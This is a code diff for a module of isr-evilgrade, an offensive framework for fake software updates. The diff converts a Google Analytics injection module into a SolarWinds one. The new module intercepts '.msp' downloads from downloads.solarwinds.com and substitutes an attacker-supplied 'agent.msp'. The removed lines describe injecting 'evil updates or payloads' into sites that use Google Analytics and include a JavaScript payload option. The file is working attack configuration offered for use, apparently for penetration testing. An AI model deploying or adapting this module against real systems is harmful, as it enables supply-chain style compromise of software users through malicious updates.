@@ -1,7 +1,7 @@
 ###############
-# googleanalytics.pm
+# solarwinds.pm
 #
-# Copyright 2010 Francisco Amato
+# Copyright 2020 Francisco Amato
 #
 # This file is part of isr-evilgrade, www.faradaysec.com .
 #
@@ -20,7 +20,7 @@
 #
 # '''
 ##
-package modules::googleanalytics;
+package modules::solarwinds;
 
 use strict;
 use Data::Dump qw(dump);
@@ -28,26 +28,17 @@ use Data::Dump qw(dump);
 use isrcore::utils;
 
 my $base = {
-    'name'    => 'Google Analytics',
-    'version' => '1.0',
-    'appver'  => '< ',
-    'author'  => ['Francisco Amato < famato +[AT]+ faradaysec.com>'],
-    'description' =>
-        qq{This module is used to inject evil updates or payloads in all site with google analytics implementation},
-    'vh'      => '(ssl.google-analytics.com|www.google-analytics.com)',
-    'request' => [
-        {   'req'    => '(/ga.js|/urchin.js)',      #regex friendly #10.0
-            'type'   => 'file',                     #file|string|agent|install
-            'method' => '',                         #any
-            'bin'    => 0,
-            'string' => "",
-            'parse'  => 1,
-            'file'   => './include/google/ga.js',
-        },
-
-        {   'req'    => '.exe',                     #regex friendly
-            'type'   => 'agent',                    #file|string|agent|install
-            'method' => '',                         #any
+    'name'    => 'solarwinds',
+    'appver'  => '1.0',
+    'version' => '<2020.2.1 HF 2',
+    'author'  => ['Francisco Amato < famato +[AT]+ faradaysec.com >'],
+    'description' => qq{https://www.fireeye.com/blog/products-and-services/2020/12/global-intrusion-campaign-leverages-software-supply-chain-compromise.html, 
+        https://www.solarwinds.com/securityadvisory},
+    'vh'          => 'downloads.solarwinds.com',
+    'request'     => [
+        {   'req'    => '.msp',     #regex friendly
+            'type'   => 'agent',    #file|string|agent|install
+            'method' => '',         #any
             'bin'    => 1,
             'string' => '',
             'parse'  => 0,
@@ -59,20 +50,17 @@ my $base = {
     #Options
     'options' => {
         'agent' =>
-            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
+            { 'val' => './agent/agent.msp', 'desc' => 'Agent to inject' },
         'enable' => {
             'val'  => 1,
             'desc' => 'Status'
-        },
-        'payload' => {
-            'val'  => 'alert(\'test\');',
-            'desc' => 'Javascript Payload'
         },
         'rnd1' => {
             'val'     => 'isrcore::utils::RndNum(5)',
             'hidden'  => 1,
             'dynamic' => 1,
-        }
+        },
+
     }
 };
 
